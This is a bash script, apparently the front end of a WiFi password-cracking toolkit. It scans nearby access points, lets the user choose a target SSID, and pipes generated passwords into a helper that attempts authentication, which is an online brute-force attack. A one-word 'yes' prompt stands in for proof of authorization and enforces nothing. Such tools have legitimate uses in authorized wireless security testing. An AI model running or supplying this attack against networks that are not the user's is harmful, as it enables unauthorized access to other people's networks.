#!/usr/bin/env bash
set -euo pipefail

DIR="$(cd "$(dirname "$0")/.." && pwd)"
INTERFACE="${1:-wlan0}"

echo "[*] Scanning for access points on $INTERFACE ..."
echo ""

SCAN_OUT=$("$DIR/scripts/scan_wifi.sh" "$INTERFACE" 2>&1)

if echo "$SCAN_OUT" | grep -qi "error\|not found\|no networks"; then
    echo "$SCAN_OUT"
    exit 1
fi

echo "$SCAN_OUT"
echo ""

# Extract SSIDs using raw nmcli -t format (handles spaces in SSID names)
SSIDS=()
if command -v nmcli &>/dev/null; then
    while IFS=: read -r ssid signal enc; do
        [ -n "$ssid" ] && SSIDS+=("$ssid")
    done < <(nmcli -t -f SSID,SIGNAL dev wifi list ifname "$INTERFACE" 2>/dev/null)
fi

if [ ${#SSIDS[@]} -eq 0 ]; then
    echo "[-] No access points found."
    exit 1
fi

echo "[*] Select an access point (1-${#SSIDS[@]}):"
select TARGET in "${SSIDS[@]}"; do
    if [[ -n "$TARGET" ]]; then
        echo ""
        echo "[+] Selected: $TARGET"
        break
    else
        echo "[-] Invalid selection, try again."
    fi
done

read -r -p "Confirm that '$TARGET' belongs to you or you have explicit written permission to test it [yes/no]: " AUTHORIZED
if [[ "${AUTHORIZED,,}" != "yes" ]]; then
    echo "[-] Authorization confirmation required; stopping without any authentication attempt." >&2
    exit 1
fi

read -r -p "[*] Charset preset [all]: " CHARSET
CHARSET="${CHARSET:-all}"

read -r -p "[*] Min password length [8]: " MIN
MIN="${MIN:-8}"

read -r -p "[*] Max password length [8]: " MAX
MAX="${MAX:-8}"

read -r -p "[*] Limit attempts (0 = unlimited) [0]: " LIMIT
LIMIT="${LIMIT:-0}"

echo ""
echo "[*] Starting brute-force attack on '$TARGET'"
echo "[*] Charset: $CHARSET  |  Length: $MIN-$MAX  |  Limit: $LIMIT"
echo "[*] $(date)"
echo ""

"$DIR/scripts/gen_passwords.py" --charset "$CHARSET" --min "$MIN" --max "$MAX" --limit "$LIMIT" | \
    "$DIR/scripts/auth_test.py" --ssid "$TARGET" --interface "$INTERFACE" --limit "$LIMIT"
